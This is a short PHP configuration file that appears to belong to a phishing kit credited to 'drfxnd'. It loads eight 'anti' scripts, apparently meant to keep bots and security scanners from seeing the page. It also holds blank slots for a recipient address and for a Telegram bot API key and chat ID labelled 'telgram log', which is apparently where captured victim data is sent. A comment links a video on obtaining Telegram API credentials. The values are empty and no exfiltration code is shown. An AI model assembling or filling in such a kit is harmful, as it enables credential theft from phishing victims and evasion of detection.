<?php
/*
Official Site : https://drfxnd.com/
Page Fb : https://www.facebook.com/Dr.fxnd/
Page IN : https://www.instagram.com/drfxnd/
Page Twitter : https://twitter.com/DrFxnd

*/

include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';

$yours =" "; 

//telgram log 

$Api = " ";
$Chatid =" ";

//How to get API ID & API HASH of a Telegram Account

https://www.youtube.com/watch?v=8naENmP3rg4

//

?>